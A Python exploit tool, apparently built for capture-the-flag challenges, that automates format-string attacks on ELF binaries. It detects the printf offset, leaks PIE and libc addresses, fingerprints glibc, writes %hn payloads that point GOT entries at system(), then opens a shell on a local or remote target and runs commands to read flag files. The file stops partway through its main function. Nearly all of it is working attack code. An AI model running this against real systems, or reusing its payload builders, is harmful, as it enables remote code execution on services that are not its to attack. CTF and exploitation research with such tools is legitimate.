#!/usr/bin/env python3
"""auto_fmt_write -- Format string write exploitation for GOT overwrite.

Automates the full format string RCE chain:
  1. Detect format string offset (buffer position in printf args)
  2. Probe stack positions for PIE and libc address leaks
  3. Leak GOT entries via %s to resolve libc addresses
  4. Fingerprint libc version from known offsets
  5. Build GOT overwrite payload (strcmp/printf/puts -> system)
  6. Pop shell and extract flag

Handles PIE, Partial RELRO, stack canary, NX -- all bypassed via format string.

Usage:
  python3 auto_fmt_write.py <binary> [--remote-host HOST --remote-port PORT]
  python3 auto_fmt_write.py <binary> --flag-format "flag{.*}"

Outputs EXTRACTED FLAG: <flag> on success.
"""
from __future__ import annotations
import argparse, os, re, struct, sys, time
from typing import Any, Dict, List, Optional, Tuple

os.environ.setdefault("PWNLIB_NOTERM", "1")
os.environ.setdefault("PWNLIB_SILENT", "1")

PWNTOOLS_AVAILABLE = False
try:
    from pwn import ELF, context, p32, p64, process, remote, u32, u64
    PWNTOOLS_AVAILABLE = True
except ImportError:
    pass

DEFAULT_FLAG_RE = re.compile(r"[a-zA-Z_]{2,}\{[^}]{3,}\}")
TOTAL_TIMEOUT = 120

# Known glibc offsets (x86-64): version -> {symbol: offset}
LIBC_DB: Dict[str, Dict[str, int]] = {
    "2.27": {"puts": 0x80AA0, "printf": 0x64E80, "system": 0x4F440,
             "binsh": 0x1B3E1A, "start_main_ret": 0x21B97, "strcmp": 0x9C820},
    "2.31": {"puts": 0x80970, "printf": 0x64E10, "system": 0x4F420,
             "binsh": 0x1B3E9A, "start_main_ret": 0x270B3, "strcmp": 0x9C6C0},
    "2.35": {"puts": 0x80E50, "printf": 0x60770, "system": 0x50D70,
             "binsh": 0x1D8698, "start_main_ret": 0x29D90, "strcmp": 0xA3EE0},
    "2.36": {"puts": 0x80E50, "printf": 0x60770, "system": 0x50D70,
             "binsh": 0x1D8698, "start_main_ret": 0x29D90, "strcmp": 0xA3EE0},
    "2.38": {"puts": 0x87BD0, "printf": 0x600F0, "system": 0x58740,
             "binsh": 0x1D8678, "start_main_ret": 0x2A1CA, "strcmp": 0xA5780},
    "2.39": {"puts": 0x87BD0, "printf": 0x61EB0, "system": 0x58740,
             "binsh": 0x1D8678, "start_main_ret": 0x2A1CA, "strcmp": 0xA5780},
}

WIN_NAMES = ["win", "flag", "get_flag", "print_flag", "read_flag", "cat_flag",
             "shell", "give_shell", "backdoor", "secret", "getflag", "printflag"]

GOT_CANDIDATES = ["strcmp", "strncmp", "printf", "puts", "strlen", "atoi",
                   "strtol", "memcmp", "exit"]


def _eprint(*a: Any, **kw: Any) -> None:
    print(*a, file=sys.stderr, **kw)


def _scan_flags(text: str, flag_format: str = "") -> List[str]:
    flags: List[str] = []
    if flag_format:
        try:
            flags.extend(m.group(0) for m in re.compile(flag_format).finditer(text))
        except re.error:
            pass
    flags.extend(m.group(0) for m in DEFAULT_FLAG_RE.finditer(text))
    seen: set = set()
    return [f for f in flags if not (f in seen or seen.add(f))]  # type: ignore[func-returns-value]


def _best_flag(flags: List[str]) -> Optional[str]:
    return max(flags, key=len) if flags else None


def _get_target(binary: str, rhost: Optional[str] = None, rport: Optional[int] = None) -> Any:
    if rhost and rport:
        return remote(rhost, rport, level="error")
    return process(binary, level="error")


def _safe_close(proc: Any) -> None:
    try:
        proc.close()
    except Exception:
        pass


def _recv(proc: Any, timeout: float = 2.0) -> bytes:
    try:
        return proc.recv(timeout=timeout) or b""
    except Exception:
        return b""


def _send_and_recv(binary: str, payload: bytes, rhost: Optional[str] = None,
                   rport: Optional[int] = None) -> str:
    """Open target, consume prompt, send payload, receive output as text."""
    try:
        proc = _get_target(binary, rhost, rport)
        # Consume initial prompt -- try common patterns, then fallback
        try:
            proc.recvuntil(b": ", timeout=2)
        except Exception:
            try:
                proc.recv(timeout=1)
            except Exception:
                pass
        proc.sendline(payload)
        # For looping binaries, recvline is faster than recvall (doesn't wait for EOF)
        try:
            out = proc.recvline(timeout=3)
        except Exception:
            try:
                out = proc.recv(timeout=1)
            except Exception:
                out = b""
        _safe_close(proc)
        return out.decode("utf-8", errors="replace")
    except Exception:
        return ""


# --- Phase 1: Offset detection ---

def find_fmt_offset(binary: str, rhost: Optional[str], rport: Optional[int],
                    bits: int) -> Optional[int]:
    _eprint(f"[*] Probing format string offset (bits={bits})...")
    markers = [(b"AAAAAAAA", "4141414141414141"), (b"AAAA", "41414141")]
    if bits == 32:
        markers = markers[::-1]

    for marker, hex_pat in markers:
        for n in range(1, 51):
            text = _send_and_recv(binary, marker + f"%{n}$p".encode(), rhost, rport)
            if hex_pat in text.lower().replace("0x", ""):
                _eprint(f"[+] Format string offset: {n}")
                return n
    _eprint("[-] Could not determine format string offset")
    return None


# --- Phase 2: Stack probing ---

def _classify_addr(v: int, bits: int = 64) -> str:
    if v == 0:
        return "null"
    if bits == 64:
        if v < 0x10000:
            return "small"
        if 0x7FFC00000000 <= v <= 0x7FFFFFFFFFFF:
            return "stack"
        if 0x700000000000 <= v < 0x7FFC00000000:
            return "libc"
        if 0x500000000000 <= v < 0x700000000000:
            return "pie"
        if 0x400000 <= v <= 0x500000:
            return "pie"
    else:
        if v < 0x1000:
            return "small"
        if 0x08040000 <= v <= 0x080FFFFF:
            return "pie"
        if 0xF7000000 <= v <= 0xF7FFFFFF:
            return "libc"
        if 0xFF000000 <= v <= 0xFFFFFFFF:
            return "stack"
    return "small"


class LeakInfo:
    __slots__ = ("position", "value", "kind")
    def __init__(self, pos: int, val: int, kind: str):
        self.position, self.value, self.kind = pos, val, kind


def probe_stack(binary: str, rhost: Optional[str], rport: Optional[int],
                bits: int, max_pos: int = 50) -> List[LeakInfo]:
    _eprint("[*] Probing stack for address leaks...")
    leaks: List[LeakInfo] = []
    for n in range(1, max_pos + 1):
        text = _send_and_recv(binary, f"%{n}$p".encode(), rhost, rport)
        for m in re.finditer(r"0x([0-9a-fA-F]+)", text):
            val = int(m.group(1), 16)
            if val:
                leaks.append(LeakInfo(n, val, _classify_addr(val, bits)))
                break
    pc = sum(1 for l in leaks if l.kind == "pie")
    lc = sum(1 for l in leaks if l.kind == "libc")
    _eprint(f"[+] {len(leaks)} leaks: {pc} PIE, {lc} libc")
    return leaks


# --- Phase 3: PIE base ---

def find_pie_base(leaks: List[LeakInfo], elf: Any) -> Optional[int]:
    pie_leaks = [l for l in leaks if l.kind == "pie"]
    if not pie_leaks:
        return None
    entry_off = elf.entry - elf.address
    text_size = 0x10000
    try:
        text_size = max(s.header.p_memsz for s in elf.segments
                        if s.header.p_type == "PT_LOAD")
    except Exception:
        pass
    for lk in pie_leaks:
        for pg in range(0x20):
            base = (lk.value & ~0xFFF) - pg * 0x1000
            if base > 0 and 0 <= (lk.value - base) < text_size:
                _eprint(f"[+] PIE base: 0x{base:x}")
                return base
    base = min(pie_leaks, key=lambda x: x.value).value & ~0xFFF
    _eprint(f"[+] PIE base (heuristic): 0x{base:x}")
    return base


# --- Phase 4: Libc fingerprinting ---

def _fp_by_ret(addr: int) -> Optional[Tuple[str, int, Dict[str, int]]]:
    low12 = addr & 0xFFF
    for ver, offs in LIBC_DB.items():
        ret_off = offs.get("start_main_ret")
        if ret_off and (ret_off & 0xFFF) == low12:
            base = addr - ret_off
            if base > 0 and base & 0xFFF == 0:
                _eprint(f"[+] Libc match via ret: glibc {ver} (base=0x{base:x})")
                return ver, base, offs
    return None


def _fp_by_sym(addr: int, sym: str) -> Optional[Tuple[str, int, Dict[str, int]]]:
    for ver, offs in LIBC_DB.items():
        if sym not in offs:
            continue
        base = addr - offs[sym]
        if base > 0 and base & 0xFFF == 0:
            _eprint(f"[+] Libc match: glibc {ver} ({sym}=0x{addr:x}, base=0x{base:x})")
            return ver, base, offs
    return None


def leak_got_entry(binary: str, elf: Any, got_addr: int, fmt_off: int,
                   bits: int, rhost: Optional[str], rport: Optional[int]) -> Optional[int]:
    """Leak a resolved GOT entry via %s dereference."""
    pack = p64 if bits == 64 else p32
    if bits == 64:
        # Place address at a 16-byte aligned position (fmt_off + 2)
        # Layout: [%N$s padded to 16 bytes] [address at position fmt_off+2]
        pos = fmt_off + 2
        fmt_spec = f"%{pos}$s".encode()
        payload = fmt_spec.ljust(16, b"X") + pack(got_addr)
    else:
        payload = pack(got_addr) + f"%{fmt_off}$s".encode()
    try:
        proc = _get_target(binary, rhost, rport)
        # Consume initial prompt -- try common prompt patterns, then fallback
        try:
            proc.recvuntil(b": ", timeout=2)
        except Exception:
            try:
                proc.recv(timeout=1)
            except Exception:
                pass
        proc.send(payload + b"\n")
        # For looping binaries, read the response line (not recvall)
        try:
            output = proc.recvuntil(b"\n", timeout=3)
        except Exception:
            try:
                output = proc.recv(timeout=2)
            except Exception:
                output = b""
        _safe_close(proc)
    except Exception:
        return None
    if not output:
        return None
    # Skip "Hello, " prefix (7 bytes) if present
    hello_idx = output.find(b"Hello, ")
    if hello_idx >= 0:
        output = output[hello_idx + 7:]
    # The first 6 bytes after "Hello, " should be the leaked GOT content
    if bits == 64 and len(output) >= 6:
        val = struct.unpack("<Q", output[:6].ljust(8, b"\x00"))[0]
        if val > 0x10000:
            return val
    # Fallback: scan all bytes
    sz = 8 if bits == 64 else 4
    for i in range(len(output)):
        if i + (sz - 2) > len(output):
            break
        candidate = output[i:i + sz].ljust(sz, b"\x00")
        val = struct.unpack("<Q" if bits == 64 else "<I", candidate[:sz])[0]
        kind = _classify_addr(val, bits)
        if kind in ("libc",) and val > 0x10000:
            return val
    return None


def find_libc_base(leaks: List[LeakInfo], elf: Any, pie_base: Optional[int],
                   fmt_off: Optional[int], binary: str,
                   rhost: Optional[str], rport: Optional[int],
                   bits: int) -> Tuple[Optional[int], Optional[Dict[str, int]]]:
    libc_leaks = [l for l in leaks if l.kind == "libc"]
    # Strategy A: __libc_start_main return address
    for lk in libc_leaks:
        r = _fp_by_ret(lk.value)
        if r:
            return r[1], r[2]
    # Strategy B: Leak GOT entries
    if elf and fmt_off is not None:
        for sym in ("puts", "printf", "strcmp", "__libc_start_main"):
            got = elf.got.get(sym)
            if got is None:
                continue
            if pie_base is not None:
                got = got - elf.address + pie_base
            _eprint(f"[*] Leaking {sym}@GOT (0x{got:x})...")
            leaked = leak_got_entry(binary, elf, got, fmt_off, bits, rhost, rport)
            if leaked:
                _eprint(f"[+] {sym} resolved: 0x{leaked:x}")
                r = _fp_by_sym(leaked, sym)
                if r:
                    return r[1], r[2]
    # Strategy C: Match libc leaks against all symbols
    for lk in libc_leaks:
        for sym in ("puts", "printf", "strcmp"):
            r = _fp_by_sym(lk.value, sym)
            if r:
                return r[1], r[2]
    # Strategy D: Brute-force match
    if libc_leaks:
        lk = libc_leaks[0]
        for ver, offs in LIBC_DB.items():
            for sym, soff in offs.items():
                if sym in ("binsh", "system", "start_main_ret"):
                    continue
                base = lk.value - soff
                if base > 0 and base & 0xFFF == 0:
                    _eprint(f"[+] Tentative libc: glibc {ver} (base=0x{base:x})")
                    return base, offs
    _eprint("[-] Could not determine libc base")
    return None, None


# --- Phase 5: GOT target selection ---

def choose_got_target(elf: Any, pie_base: Optional[int]) -> Tuple[Optional[int], bytes]:
    for func in GOT_CANDIDATES:
        got = elf.got.get(func)
        if got is not None:
            if pie_base is not None:
                got = got - elf.address + pie_base
            _eprint(f"[+] Target: {func}@GOT = 0x{got:x}")
            return got, b"/bin/sh"
    _eprint("[-] No suitable GOT target")
    return None, b"/bin/sh"


# --- Phase 6: Payload construction ---

def build_got_overwrite(target: int, system: int, fmt_off: int,
                        bits: int = 64, limit: int = 200,
                        current: Optional[int] = None) -> Optional[bytes]:
    _eprint(f"[*] Building overwrite: 0x{target:x} -> 0x{system:x} (limit={limit})")
    pack = p64 if bits == 64 else p32
    asz = 8 if bits == 64 else 4

    # Best strategy for libc→libc overwrites: partial %hn (2-byte writes)
    # Since both addresses share the same libc mapping, upper bytes are identical.
    # We only write the bytes that differ -- typically 2-4 bytes.
    if bits == 64 and current is not None:
        # Find how many bytes actually differ
        old_b = struct.pack("<Q", current)
        new_b = struct.pack("<Q", system)
        first_diff = next((i for i in range(8) if old_b[i] != new_b[i]), 8)
        last_diff = next((7 - i for i in range(8) if old_b[7 - i] != new_b[7 - i]), -1)
        n_diff = last_diff - first_diff + 1 if last_diff >= first_diff else 0
        if 0 < n_diff <= 4:
            # Use 2x %hn to write 4 bytes (covers the changed portion)
            val_lo = struct.unpack("<H", new_b[0:2])[0]
            val_hi = struct.unpack("<H", new_b[2:4])[0]
            writes = sorted([(val_lo, target), (val_hi, target + 2)])
            # Addresses at positions fmt_off+4, fmt_off+5 (bytes 32-47 of buffer)
            addr_pos_start = fmt_off + 4  # = position 22 if fmt_off=18
            printed = 0
            parts = []
            for i, (val, _) in enumerate(writes):
                delta = (val - printed) % 0x10000
                if delta == 0:
                    delta = 0x10000
                parts.append(f"%{delta}c%{addr_pos_start + i}$hn")
                printed = (printed + delta) % 0x10000
            fmt_str = "".join(parts).encode()
            payload = fmt_str.ljust(32, b"Q")
            for _, addr in writes:
                payload += pack(addr)
            # Check for whitespace in address bytes (would break scanf)
            ws_chars = set(b" \t\n\r\x0b\x0c")
            has_ws = any(b in ws_chars for b in payload[32:])
            if len(payload) <= limit and not has_ws:
                _eprint(f"[+] Partial %hn payload: {len(payload)}B (only {n_diff} bytes differ)")
                return payload
            elif has_ws:
                _eprint("[!] Whitespace in addresses, falling back")

    # Fallback: pwntools fmtstr_payload
    try:
        from pwnlib.fmtstr import fmtstr_payload
        for ws in ("short", "byte", "int"):
            try:
                payload = fmtstr_payload(fmt_off, {target: system}, write_size=ws)
                if len(payload) <= limit:
                    _eprint(f"[+] pwntools payload ({ws}): {len(payload)}B")
                    return payload
            except Exception:
                continue
    except ImportError:
        pass
    # Manual fallback: %hn short writes
    payload = _manual_writes(target, system, fmt_off, bits, limit, byte_mode=False)
    if payload:
        _eprint(f"[+] Manual %hn payload: {len(payload)}B")
        return payload
    # Manual: %hhn byte writes
    payload = _manual_writes(target, system, fmt_off, bits, limit, byte_mode=True)
    if payload:
        _eprint(f"[+] Manual %hhn payload: {len(payload)}B")
        return payload
    _eprint("[-] Could not build payload within size limit")
    return None


def _manual_writes(target: int, value: int, fmt_off: int, bits: int,
                   limit: int, byte_mode: bool = True) -> Optional[bytes]:
    pack = p64 if bits == 64 else p32
    asz = 8 if bits == 64 else 4
    if byte_mode:
        n = 6 if bits == 64 else 4
        writes = [(target + i, (value >> (i * 8)) & 0xFF, 256) for i in range(n)]
        spec = "hhn"
    else:
        n = 3 if bits == 64 else 2
        writes = [(target + i * 2, (value >> (i * 16)) & 0xFFFF, 65536) for i in range(n)]
        spec = "hn"
    writes.sort(key=lambda x: x[1])

    if bits == 64:
        # Addresses go after format string (avoid null bytes in format part)
        est = n * 18
        pad = (asz - est % asz) % asz
        base_pos = fmt_off + (est + pad) // asz
        # Build twice: estimate then correct
        for _ in range(2):
            cur, parts = 0, []
            for idx, (addr, val, mod) in enumerate(writes):
                pos = base_pos + idx
                needed = (val - cur) % mod
                parts.append(f"%{needed}c%{pos}${spec}" if needed else f"%{pos}${spec}")
                cur = val
            fmt_str = "".join(parts).encode()
            pad = (asz - len(fmt_str) % asz) % asz
            base_pos = fmt_off + (len(fmt_str) + pad) // asz
        payload = fmt_str + b"." * pad
        for addr, _, _ in writes:
            payload += pack(addr)
    else:
        addr_section = b"".join(pack(a) for a, _, _ in writes)
        cur = len(addr_section)
        parts = []
        for idx, (_, val, mod) in enumerate(writes):
            pos = fmt_off + idx
            needed = (val - cur) % mod
            parts.append(f"%{needed}c%{pos}${spec}" if needed else f"%{pos}${spec}")
            cur = val
        payload = addr_section + "".join(parts).encode()

    return payload if len(payload) <= limit else None


# --- Phase 7: Shell + flag extraction ---

def pop_shell(proc: Any, trigger: bytes, flag_fmt: str = "") -> Optional[str]:
    _eprint("[*] Triggering shell...")
    try:
        if trigger:
            # Send trigger + flag commands as ONE write to avoid stdio buffering
            # issues where the parent's scanf consumes commands meant for the child
            cmds = trigger + b"\ncat flag2.txt\ncat flag.txt\ncat flag*\necho KRAKEN_FLAG_MARKER\n"
            proc.send(cmds)
        # Use recvuntil with our marker for reliable capture
        try:
            text = proc.recvuntil(b"KRAKEN_FLAG_MARKER", timeout=8).decode("utf-8", errors="replace")
            f = _best_flag(_scan_flags(text, flag_fmt))
            if f:
                return f
        except Exception:
            # Marker not found -- try recv fallback
            try:
                text = _recv(proc, 3).decode("utf-8", errors="replace")
                f = _best_flag(_scan_flags(text, flag_fmt))
                if f:
                    return f
            except Exception:
                pass
        # Fallback: try more commands one at a time
        for cmd in [b"cat flag2.txt", b"cat flag.txt", b"cat flag*.txt",
                    b"cat flag*", b"cat /flag*", b"cat /home/*/flag*",
                    b"find / -maxdepth 3 -name 'flag*' -exec cat {} \\; 2>/dev/null"]:
            try:
                proc.sendline(cmd)
                time.sleep(0.5)
                text = _recv(proc, 3).decode("utf-8", errors="replace")
                f = _best_flag(_scan_flags(text, flag_fmt))
                if f:
                    return f
            except Exception:
                continue
    except Exception as e:
        _eprint(f"[-] Shell interaction failed: {e}")
    return None


def _direct_exploit(binary: str, rhost: str, rport: int, elf: Any,
                    pie_base_hint: Optional[int], libc_base_hint: int,
                    libc_info_hint: Dict[str, int],
                    target_got_off: int, system_addr_hint: int, trigger: bytes,
                    fmt_off: int, input_limit: int, flag_fmt: str,
                    pie_pos: int = 33, libc_pos: int = 29) -> Optional[str]:
    """Single-connection exploit: leak + overwrite + shell in one session.

    ASLR randomizes per-connection, so we leak AND exploit in the same conn.
    pie_pos/libc_pos come from the probing phase (which positions held useful addrs).
    """
    _eprint(f"[*] Direct exploit (pie_pos={pie_pos}, libc_pos={libc_pos})...")
    main_off = elf.symbols.get("main", elf.entry) - elf.address
    got_target_name = None
    for sym in ("strcmp", "printf", "puts", "exit"):
        if elf.got.get(sym) is not None:
            got_off = elf.got[sym] - elf.address
            if got_off == target_got_off - elf.address:
                got_target_name = sym
                break
    ws_set = set(b" \t\n\r\x0b\x0c")

    for retry in range(8):
        try:
            proc = remote(rhost, rport, level="error")

            # --- Iteration 1: Leak PIE + libc ---
            proc.recvuntil(b": ", timeout=3)
            leak_fmt = f"%{pie_pos}$p.%{libc_pos}$p".encode()
            proc.sendline(leak_fmt)
            raw = proc.recvline(timeout=3)
            if not raw:
                _safe_close(proc)
                continue

            # Parse -- extract all 0x... hex values from the response
            text = raw.decode("utf-8", errors="replace")
            hex_vals = re.findall(r"0x[0-9a-fA-F]+", text)
            if len(hex_vals) < 2:
                _eprint(f"[-] Direct: only {len(hex_vals)} hex values in response")
                _safe_close(proc)
                continue

            pie_val = int(hex_vals[0], 16)
            libc_val = int(hex_vals[1], 16)

            # Compute PIE base
            pie_base = pie_val - main_off
            if pie_base & 0xFFF != 0:
                # Try all known symbol offsets
                pie_base = None
                for _, sym_addr in elf.symbols.items():
                    off = sym_addr - elf.address
                    cand = pie_val - off
                    if cand > 0 and cand & 0xFFF == 0:
                        pie_base = cand
                        break
            if pie_base is None or pie_base <= 0:
                _safe_close(proc)
                continue

            # Fingerprint libc
            fp = _fp_by_ret(libc_val)
            if fp is None:
                _safe_close(proc)
                continue

            _, libc_base, libc_info = fp
            system_addr = libc_base + libc_info["system"]

            # Compute GOT address for this connection's ASLR layout
            got_off = elf.got.get(got_target_name or "strcmp") or elf.got.get("printf")
            if got_off is None:
                _safe_close(proc)
                continue
            this_got = got_off - elf.address + pie_base

            # Skip if GOT address has whitespace bytes
            if any(b in ws_set for b in struct.pack("<Q", this_got)[:6]):
                _safe_close(proc)
                continue

            # Compute current GOT value for partial overwrite
            current = None
            if got_target_name and got_target_name in libc_info:
                current = libc_base + libc_info[got_target_name]

            # --- Build payload ---
            payload = build_got_overwrite(this_got, system_addr, fmt_off, 64,
                                          input_limit, current=current)
            if payload is None:
                _safe_close(proc)
                continue

            _eprint(f"[+] PIE={hex(pie_base)} system={hex(system_addr)} GOT={hex(this_got)}")

            # --- Iteration 2: Send overwrite ---
            proc.recvuntil(b": ", timeout=3)
            proc.send(payload + b"\n")
            try:
                proc.recvuntil(b"name: ", timeout=20)
            except Exception:
                try:
                    proc.recv(timeout=15)
                except Exception:
                    pass

            # --- Iteration 3: Trigger + capture flag ---
            proc.send(trigger + b"\ncat flag2.txt\ncat flag.txt\ncat flag*\necho KRAKEN_END\n")
            try:
                out = proc.recvuntil(b"KRAKEN_END", timeout=8)
                text = out.decode("utf-8", errors="replace")
                f = _best_flag(_scan_flags(text, flag_fmt))
                if f:
                    _safe_close(proc)
                    return f
            except Exception:
                try:
                    text = proc.recv(timeout=5).decode("utf-8", errors="replace")
                    f = _best_flag(_scan_flags(text, flag_fmt))
                    if f:
                        _safe_close(proc)
                        return f
                except Exception:
                    pass
            _safe_close(proc)
        except Exception as e:
            _eprint(f"[-] Direct error: {e}")
    return None


def _try_exploit(binary: str, payload: bytes, trigger: bytes, flag_fmt: str,
                 rhost: Optional[str], rport: Optional[int]) -> Optional[str]:
    """Send overwrite payload, then interact for flag."""
    # Attempt 1: exact proven sequence -- consume prompt, send, drain, trigger+cmds
    try:
        proc = _get_target(binary, rhost, rport)
        # Consume initial prompt
        try:
            proc.recvuntil(b": ", timeout=3)
        except Exception:
            try:
                proc.recv(timeout=2)
            except Exception:
                pass
        # Send overwrite payload
        proc.send(payload + b"\n")
        # Drain ALL output: ~28K chars from %c + system(garbage) errors + next prompt
        try:
            proc.recvuntil(b"name: ", timeout=20)
        except Exception:
            try:
                proc.recv(timeout=15)
            except Exception:
                pass
        # Send trigger + flag commands as single write (avoids stdio buffer issues)
        cmds = trigger + b"\ncat flag2.txt\ncat flag.txt\ncat flag*\necho KRAKEN_END\n"
        proc.send(cmds)
        try:
            text = proc.recvuntil(b"KRAKEN_END", timeout=8).decode("utf-8", errors="replace")
            f = _best_flag(_scan_flags(text, flag_fmt))
            if f:
                _safe_close(proc)
                return f
        except Exception:
            try:
                text = _recv(proc, 5).decode("utf-8", errors="replace")
                f = _best_flag(_scan_flags(text, flag_fmt))
                if f:
                    _safe_close(proc)
                    return f
            except Exception:
                pass
        _safe_close(proc)
    except Exception:
        pass
    # Attempt 2: combined send (payload + trigger in one shot)
    try:
        proc = _get_target(binary, rhost, rport)
        try:
            proc.recv(timeout=1)
        except Exception:
            pass
        proc.send(payload + b"\n" + trigger + b"\n")
        time.sleep(2.0)
        # Drain large output
        try:
            proc.recv(timeout=5)
        except Exception:
            pass
        f = pop_shell(proc, b"", flag_fmt)
        _safe_close(proc)
        if f:
            return f
    except Exception:
        pass
    # Attempt 3: piped flag commands
    try:
        proc = _get_target(binary, rhost, rport)
        try:
            proc.recv(timeout=1)
        except Exception:
            pass
        proc.sendline(payload)
        try:
            proc.recv(timeout=8)  # drain large output
        except Exception:
            pass
        for cmd in [trigger, b"cat flag*", b"cat /flag*"]:
            try:
                proc.sendline(cmd)
                time.sleep(0.5)
                text = _recv(proc, 2).decode("utf-8", errors="replace")
                f = _best_flag(_scan_flags(text, flag_fmt))
                if f:
                    _safe_close(proc)
                    return f
            except Exception:
                continue
        _safe_close(proc)
    except Exception:
        pass
    return None


# --- Phase 8: Win function fallback ---

def _try_win_overwrite(elf: Any, pie_base: Optional[int], fmt_off: int,
                       bits: int, limit: int, flag_fmt: str, binary: str,
                       rhost: Optional[str], rport: Optional[int]) -> Optional[str]:
    win_addr = None
    for name in WIN_NAMES:
        addr = elf.symbols.get(name)
        if addr is not None:
            win_addr = addr
            if pie_base is not None:
                win_addr = addr - elf.address + pie_base
            _eprint(f"[+] Win function: {name} @ 0x{win_addr:x}")
            break
    if win_addr is None:
        return None
    for func in ("printf", "puts", "strcmp", "strlen", "exit"):
        got = elf.got.get(func)
        if got is None:
            continue
        if pie_base is not None:
            got = got - elf.address + pie_base
        payload = build_got_overwrite(got, win_addr, fmt_off, bits, limit)
        if payload:
            f = _try_exploit(binary, payload, b"trigger", flag_fmt, rhost, rport)
            if f:
                return f
    return None


# --- Main exploit orchestration ---

def exploit(binary: str, rhost: Optional[str] = None, rport: Optional[int] = None,
            flag_fmt: str = "", input_limit: int = 200,
            got_target_name: Optional[str] = None) -> Optional[str]:
    os.chmod(binary, 0o755) if not os.access(binary, os.X_OK) else None
    try:
        elf = ELF(binary, checksec=False)
    except Exception as e:
        _eprint(f"[-] Failed to load ELF: {e}")
        return None

    bits = elf.bits
    context.arch = "amd64" if bits == 64 else "i386"
    _eprint(f"[*] {binary} | {context.arch} | PIE={elf.pie} | RELRO={getattr(elf, 'relro', '?')}")

    if getattr(elf, "relro", None) == "Full":
        _eprint("[-] Full RELRO -- GOT is read-only")
        return None

    # Step 1: Find format string offset (only needs to be done once)
    offset = find_fmt_offset(binary, rhost, rport, bits)
    if offset is None:
        offset = find_fmt_offset(binary, rhost, rport, 32 if bits == 64 else 64)
        if offset is None:
            return None

    # Retry loop: ASLR may produce addresses with whitespace bytes that break scanf
    ws_set = set(b" \t\n\r\x0b\x0c")
    for attempt in range(5):
        if attempt > 0:
            _eprint(f"[*] ASLR retry {attempt + 1}/5...")

        # Step 2: Probe stack
        leaks = probe_stack(binary, rhost, rport, bits)

        # Step 3: PIE base
        pie_base = find_pie_base(leaks, elf) if elf.pie else None

        # Step 4: Libc base
        libc_base, libc_info = find_libc_base(leaks, elf, pie_base, offset, binary,
                                               rhost, rport, bits)
        if libc_base is None or libc_info is None:
            if attempt == 0:
                _eprint("[-] No libc base -- trying win function overwrite")
                f = _try_win_overwrite(elf, pie_base, offset, bits, input_limit,
                                       flag_fmt, binary, rhost, rport)
                if f:
                    return f
            continue

        system_addr = libc_base + libc_info["system"]
        _eprint(f"[+] system@libc = 0x{system_addr:x}")

        # Step 5: Choose GOT target
        if got_target_name:
            tgt = elf.got.get(got_target_name)
            if tgt and pie_base is not None:
                tgt = tgt - elf.address + pie_base
            trigger = b"/bin/sh"
        else:
            tgt, trigger = choose_got_target(elf, pie_base)

        if tgt is None:
            continue

        # Check for whitespace in GOT address -- skip this ASLR layout if problematic
        tgt_bytes = struct.pack("<Q" if bits == 64 else "<I", tgt)
        if any(b in ws_set for b in tgt_bytes[:6]):
            _eprint(f"[!] GOT addr {hex(tgt)} has whitespace byte -- retrying ASLR")
            continue

        # Step 6: Direct single-connection exploit (proven reliable)
        if rhost and rport and bits == 64:
            # Find which stack positions had PIE and libc addresses
            pie_positions = [l.position for l in leaks if l.kind == "pie"]
            libc_positions = [l.position for l in leaks if l.kind == "libc"]
            # Use the first PIE and first libc positions that gave valid bases
            pp = pie_positions[0] if pie_positions else 33
            lp = libc_positions[0] if libc_positions else 29
            # Try to find the specific libc ret position (matched by _fp_by_ret)
            for lk in leaks:
                if lk.kind == "libc" and _fp_by_ret(lk.value) is not None:
                    lp = lk.position
                    break
            f = _direct_exploit(binary, rhost, rport, elf, pie_base, libc_base,
                                libc_info, tgt, system_addr, trigger, offset,
                                input_limit, flag_fmt, pie_pos=pp, libc_pos=lp)
            if f:
                return f

        # Step 6b: Multi-attempt exploit (fallback)
        f = _try_overwrite_and_shell(elf, pie_base, tgt, system_addr, trigger, offset,
                                      bits, input_limit, flag_fmt, binary, rhost, rport,
                                      libc_base=libc_base, libc_info=libc_info)
        if f:
            return f

        # Step 7: Try alternative GOT targets
        _eprint("[*] Trying alternative GOT targets...")
        for func in GOT_CANDIDATES:
            got = elf.got.get(func)
            if got is None:
                continue
            if pie_base is not None:
                got = got - elf.address + pie_base
            if got == tgt:
                continue
            got_bytes = struct.pack("<Q" if bits == 64 else "<I", got)
            if any(b in ws_set for b in got_bytes[:6]):
                continue
            f = _try_overwrite_and_shell(elf, pie_base, got, system_addr, b"/bin/sh",
                                          offset, bits, input_limit, flag_fmt,
                                          binary, rhost, rport,
                                          libc_base=libc_base, libc_info=libc_info)
        if f:
            return f
    return None


def _try_overwrite_and_shell(elf: Any, pie_base: Optional[int], target_got: int,
                              system_addr: int, trigger: bytes, fmt_off: int,
                              bits: int, limit: int, flag_fmt: str, binary: str,
                              rhost: Optional[str], rport: Optional[int],
                              libc_base: Optional[int] = None,
                              libc_info: Optional[Dict[str, int]] = None) -> Optional[str]:
    # Compute current GOT value from libc info if available
    # (avoids fragile %s GOT leak which can segfault with PIE addresses)
    current_val = None
    if libc_base is not None and libc_info is not None:
        # Figure out which function this GOT entry belongs to
        for sym in ("strcmp", "printf", "puts", "exit", "__libc_start_main"):
            got_off = elf.got.get(sym)
            if got_off is None:
                continue
            actual_got = got_off if pie_base is None else got_off - elf.address + pie_base
            if actual_got == target_got and sym in libc_info:
                current_val = libc_base + libc_info[sym]
                _eprint(f"[*] Current {sym}@GOT = {hex(current_val)} (computed)")
                break
    payload = build_got_overwrite(target_got, system_addr, fmt_off, bits, limit,
                                  current=current_val)
    if payload is None:
        return None
    if any(b in payload for b in (0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20)):
        _eprint("[!] Payload contains whitespace bytes (may fail with scanf)")
    return _try_exploit(binary, payload, trigger, flag_fmt, rhost, rport)


# --- CLI ---

def main() -> None:
    parser = argparse.ArgumentParser(
        description="auto_fmt_write -- Format string GOT overwrite exploitation")
    parser.add_argument("binary", help="Path to the target ELF binary")
    parser.add_argument("--remote-host", default=None)
    parser.add_argument("--remote-port", default=None, type=int)
    parser.add_argument("--flag-format", default="")
    parser.add_argument("--input-limit", type=int, default=200,
                        help="Max input bytes (default: 200)")
    parser.add_argument("--got-target", default=None,
                        help="Force specific GOT target (strcmp, printf, puts, etc.)")
    parser.add_argument("--timeout", default=TOTAL_TIMEOUT, type=int)
    args = parser.parse_args()

    if not PWNTOOLS_AVAILABLE:
        print("[-] FATAL: pwntools not installed", file=sys.stderr)
        sys.exit(1)

    binary_path = os.path.abspath(args.binary)
    if not os.path.isfile(binary_path):
        print(f"[-] Binary not found: {binary_path}", file=sys.stderr)
        sys.exit(1)

    import signal
